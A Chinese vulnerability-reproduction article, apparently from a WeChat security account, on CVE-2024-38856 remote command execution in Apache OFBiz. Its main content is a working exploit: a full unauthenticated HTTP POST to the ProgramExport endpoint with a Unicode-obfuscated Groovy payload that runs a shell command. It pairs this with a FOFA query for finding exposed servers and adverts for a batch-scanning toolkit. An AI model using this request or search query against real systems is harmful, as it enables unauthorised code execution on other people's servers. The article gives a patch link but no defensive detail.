<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kH7OdEIG41P5ndcVeC_PBQ)

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. Apache OFBiz 系统简介
--------------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

Apache OFBiz 是美国阿帕奇（Apache）基金会的一套企业资源计划（ERP）系统。

2. 漏洞描述
-------

Apache OFBiz 是美国阿帕奇（Apache）基金会的一套企业资源计划（ERP）系统。该系统提供了一整套基于 Java 的 Web 应用程序组件和工具。Apache OFBiz 18.12.14 及之前版本存在安全漏洞，该漏洞源于存在授权错误漏洞，从而导致未经身份验证的端点可执行屏幕渲染代码。

CVE 编号: CVE-2024-38856

CNNVD 编号: CNNVD-202408-247

CNVD 编号:

3. 影响版本
-------

Apache OFBiz 18.12.14 及之前版本

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS56WCyOtznlia1eZFQicKVrGTJQNFpm7iaIr6YlOsNwQvXne9HKiapVSdkLg/640?wx_fmt=jpeg&from=appmsg)Apache OFBiz 系统 ProgramExport 接口存在远程命令执行漏洞

4.fofa 查询语句
-----------

app="Apache_OFBiz"

5. 漏洞复现
-------

漏洞链接：https://xxx.xxx.xx.xx/webtools/control/main/ProgramExport

漏洞数据包，执行 id 命令：

```
POST /webtools/control/main/ProgramExport HTTP/1.1
User-Agent:Mozilla/5.0(Macintosh;IntelMac OS X 10_15_7)AppleWebKit/537.36(KHTML, like Gecko)Chrome/125.0.0.0Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
Host: xxx.xxx.xxx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 260

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5YXeb9rZugX4cWxiaTia2VJDre2gtKTiaT5Ybz4CxMt2o4dRiatsh4hG9ibw/640?wx_fmt=jpeg&from=appmsg)

其中的 payload 是 Unicode 编码

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5QhIPYicxlBiaVAUiadn9aWGpTicOWUHKUrFLdD17hN0AFhAHyevIzWYJIQ/640?wx_fmt=jpeg&from=appmsg)

6.POC&EXP
---------

本期漏洞及往期漏洞的批量扫描 POC 及 POC 工具箱已经上传知识星球：南风网络安全  
1: 更新 poc 批量扫描软件，承诺，一周更新 8-14 个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费 fofa 查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5aXDfA6QZ1vpWysexlSd9Yib7rVQLnYvG7zLOT32oUWHorl3W4T7AYWg/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5AUuhjdJDPrCpaiaRDu4g8ODM7j0IaYrFtYMS0ZW48acZB4L990rVK1g/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5CqjKb4BO37OLDKiaoC2HsG4ojFxKgw3KlSicPGsqPytVVroGicwMpSL9g/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y6jlBVBicDDleu51yDqQicS5XFprS8dskTziaicd8VYaHEuokyicghxziaE0o9fm1GZgNQAeYbGbyR0iaicA/640?wx_fmt=jpeg&from=appmsg)

7. 整改意见
-------

官方补丁 https://lists.apache.org/thread/olxxjk6b13sl3wh9cmp0k2dscvp24l7w

8. 往期回顾
-------